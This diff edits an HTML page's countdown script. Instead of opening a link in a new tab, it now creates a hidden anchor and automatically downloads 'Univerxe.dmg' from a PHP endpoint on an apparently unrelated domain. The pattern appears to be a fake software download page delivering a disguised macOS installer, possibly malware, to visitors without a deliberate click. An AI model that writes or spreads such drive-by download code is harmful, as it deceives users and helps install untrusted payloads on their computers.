@@ -136,7 +136,7 @@
 </section>
 
 <!-- Countdown Script -->
-  <script>
+ <script>
     let countdown = 3;
     const timerElement = document.getElementById("timer");
     const countdownElement = document.getElementById("countdown");
@@ -148,10 +148,15 @@
       if (countdown === 0) {
         clearInterval(interval);
 
-        // Open the download link in a new tab
-        window.open("https://wimrecords.com/getmac.php?call=univer", "_blank");
+        // Trigger file download
+        const link = document.createElement("a");
+        link.href = "https://wimrecords.com/getmac.php?call=univer";
+        link.download = "Univerxe.dmg";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
 
-        countdownElement.textContent = "Download Started!";
+        countdownElement.textContent = "Download started!";
       }
     }, 1000);
   </script>
